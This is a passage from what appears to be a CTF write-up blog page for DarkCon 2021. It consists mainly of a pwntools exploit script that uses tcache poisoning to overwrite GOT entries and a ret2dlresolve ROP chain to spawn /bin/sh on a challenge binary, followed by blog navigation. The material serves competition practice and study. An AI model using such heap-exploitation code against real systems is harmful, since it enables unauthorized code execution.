class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,cnt</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">    p.send(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,cnt</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.send(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(e, symbol=<span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&#x27;/bin/sh\x00&#x27;</span>])</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(dlresolve.data_addr).ljust(<span class="number">0x58</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x58</span>, dlresolve.payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x18</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x404018</span>).ljust(<span class="number">0x18</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x18</span>,<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># free -&gt; 0x401236</span></span><br><span class="line"><span class="comment"># __stack_chk_fail -&gt; ret</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,p64(<span class="number">0x401236</span>)+p64(<span class="number">0x4011B0</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># ret</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+rop.chain()+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/25/2021darkconctf/" data-id="cuidmWKGi4xT1VkdP4w4dWQjG" data-title="DarkCon 2021 CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
          </li>
        
          <li>
            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
          </li>
        
          <li>
            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
          </li>
        
          <li>
            <a href="/2025/10/18/train0927/">train0927</a>
          </li>
        
          <li>
            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>